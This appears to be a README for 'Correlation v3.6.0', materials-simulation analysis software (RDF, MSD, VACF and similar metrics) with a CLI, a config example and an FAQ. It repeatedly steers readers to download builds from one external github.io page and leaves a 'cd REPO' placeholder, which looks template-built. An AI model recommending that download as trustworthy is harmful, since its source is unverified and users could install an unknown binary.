# Correlation v3.6.0 - materials analysis software 2026

> **Correlation v3.6.0 is a materials analysis stack for structural and dynamic correlation work, available as a desktop app, CLI, and Python library so you can run GUI or headless jobs on simulation data.**

[![Platform](https://img.shields.io/badge/Platform-desktop%2C%20CLI%2C%20Python-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v3.6.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/mhayes2000/correlation-materials-cli?style=flat-square)](https://github.com/mhayes2000/correlation-materials-cli)

---

<p align="center">
  <a href="https://mhayes2000.github.io/correlation-materials-cli/">
    <img src="https://img.shields.io/badge/Download-Correlation%20Latest-brightgreen?style=for-the-badge" alt="Download Correlation">
  </a>
</p>

> **[Download - Correlation v3.6.0](https://mhayes2000.github.io/correlation-materials-cli/)**

---

[Download Latest Build](https://mhayes2000.github.io/correlation-materials-cli/)

---

## What Correlation Is For

Correlation targets materials researchers and developers who post-process molecular simulation output. Whether the system is liquid, amorphous, or crystalline, the tool converts trajectory and structure files into correlation quantities you can compare, inspect, and ship downstream.

Interactive sessions and automated pipelines both fit: the same core analysis is exposed through a GUI, a command-line interface, and Python bindings. That mix is practical when formats differ, datasets grow large, or several correlation measures need to run in one pass.

---

## Capabilities

- Desktop GUI plus headless CLI for interactive or batch runs
- Structural and dynamic correlation metrics in a single package
- RDF, PAD, DAD, CNA, MSD, VACF, VDOS, S(Q), and XRD covered
- Parallel execution via SIMD and TBB
- CUDA offload when the build and hardware allow it
- Reads common simulation inputs such as CAR, CELL, and ARC
- Writes CSV, Parquet, and HDF5
- Python API for automation and embedding in larger tools

---

## Getting Started

Obtain the source or the latest packaged build, then start Correlation in the mode you need.

    git clone https://github.com/mhayes2000/correlation-materials-cli.git
    cd REPO

Open the desktop binary for GUI work, or drive analysis from the CLI and Python modules when you prefer scripts.

---

## How to Run It

A common path is: bring in simulation data, pick the analysis, compute, then write results out.

Example:

    correlation --input sample.arc --analysis rdf --output results.csv

The same toolchain can stack several analyses—for example structure-factor checks, VACF/MSD motion diagnostics, or side-by-side crystalline versus amorphous comparisons inside one project.

---

## Settings

Tune behavior from the GUI, CLI flags, or Python, depending on how you invoke Correlation.

Reusable defaults often live in a local config or in the launcher script:

    {
      "input_format": "ARC",
      "analyses": ["rdf", "vacf", "vdos"],
      "export_format": "parquet",
      "use_cuda": false
    }

---

## System Needs

- Environment that can run desktop, CLI, or Python workflows
- Simulation inputs in supported forms (for example CAR, CELL, ARC)
- Memory and disk space matched to your dataset size
- CUDA-capable hardware only if you want optional acceleration
- Runtime with TBB and SIMD support so parallel paths can engage when present

---

## FAQ

**Where do new builds come from?**  
Grab the current release from the download link at the top of this page.

**Is the GUI required?**  
No. Headless CLI mode and Python bindings support fully scripted analysis.

**How are options controlled?**  
Through GUI controls, command-line arguments, or Python code—whichever path you use.

**What about formats outside the usual set?**  
Major simulation formats are supported; import details follow the specific file type you supply.

**Analysis feels slow—what helps?**  
Lean on the parallel paths, and turn on CUDA when your machine and build include it.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
